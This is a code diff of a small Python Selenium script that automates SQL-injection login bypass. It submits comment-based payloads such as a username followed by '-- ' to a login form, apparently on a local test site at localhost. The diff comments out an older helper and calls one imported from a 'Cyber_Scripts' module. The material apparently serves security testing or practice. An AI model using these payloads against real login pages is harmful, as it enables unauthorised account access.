@@ -3,13 +3,13 @@ from selenium.common import UnexpectedAlertPresentException
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.action_chains import ActionChains
+from Cyber_Scripts import *
 
 import time
 
-
+"""
 def try_sqlinj(address, user_name, password):
-    driver = webdriver.Chrome()
-
+    driver = webdriver.Firefox()
     driver_url = address
     driver.get(driver_url)
 
@@ -48,13 +48,16 @@ def try_sqlinj(address, user_name, password):
     # Close the browser window
     driver.quit()
     return passed
+"""
 
 
-def execute(address, user_name="a@a.a"):
+def execute(login_page_url, user_name="a@a.a"):
     injections = [[f"{user_name}'/*", "'*/'"], [f"{user_name}'-- ", ""]]
     for injection in injections:
-        passed = try_sqlinj(injection[0], injection[1], address)
+        passed = enter_login_input(login_page_url, injection[0], injection[1])
         if passed:
             print('sql injection succeeded')
             exit(0)
     print('sql injection failed')
+
+execute(login_page_url="http://localhost/site/login.php")
